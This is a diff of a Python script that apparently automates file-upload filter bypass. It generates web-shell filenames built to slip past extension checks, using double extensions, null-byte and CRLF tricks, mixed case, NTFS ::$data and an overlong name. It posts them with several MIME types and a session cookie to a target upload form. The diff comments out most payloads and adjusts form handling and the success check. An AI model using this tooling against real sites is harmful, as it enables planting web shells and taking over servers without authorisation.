@@ -37,21 +37,21 @@ def create_payloads():
     payloads = [
         "shell.php.jpg",
         "shell.php.png",   
-        "shell.pHp5",
-        "shell.png.php",
-        "shell.php#.png",
-        "shell.php%20",
-        "shell.phpJunk123png",
-        "shell.png.jpg.php",
-        "shell.php%00.png",
-        "shell.php...",
-        "shell.php.png",
-        "shell.asp::$data",
-        "A" * 232 + ".php",
-        "shell.php%0a",
-        "shell.php%00",
-        "shell.php%0d%0a",
-        "shell.php%00.png%00.jpg"
+        # "shell.pHp5",
+        # "shell.png.php",
+        # "shell.php#.png",
+        # "shell.php%20",
+        # "shell.phpJunk123png",
+        # "shell.png.jpg.php",
+        # "shell.php%00.png",
+        # "shell.php...",
+        # "shell.php.png",
+        # "shell.asp::$data",
+        # "A" * 232 + ".php",
+        # "shell.php%0a",
+        # "shell.php%00",
+        # "shell.php%0d%0a",
+        # "shell.php%00.png%00.jpg"
     ]
 
     created_files = []
@@ -129,6 +129,8 @@ def upload_file(payload_filename, upload_url, cookie, form_details, mime_types_f
             data[form_field[0]] = "test@test.com"
         if form_field[1] == "hidden":
             data[form_field[0]] = form_field[2]
+        if form_field[1] == "submit":
+            data[form_field[0]] = form_field[2]
     
     for textarea in form_details["textarea"]:
         data[textarea] = "test"
@@ -138,15 +140,14 @@ def upload_file(payload_filename, upload_url, cookie, form_details, mime_types_f
 
     for mime_type in mime_types:
         try:
-            print(data)
             with open(payload_filename, 'rb') as file:
                 file_to_upload = {file_field_name: (payload_filename, file, mime_type)}
-                # file_to_upload = {'upload_file': (payload_filename, file, mime_type)}
+                print(file_to_upload)
                 print(f"[*] Trying upload with MIME type: Filename: {payload_filename} : {mime_type} to {upload_url}...")
                 response = requests.post(upload_url, headers=headers, data=data, files=file_to_upload)
                 
                 print(response.text)
-                if "successfully uploaded!" in response.text or "submitted successfully" in response.text:
+                if "succesfully uploaded!" in response.text or "submitted successfully" in response.text:
                     print(f"[+] File uploaded successfully using MIME type: {mime_type}")
                     return True
                 else:
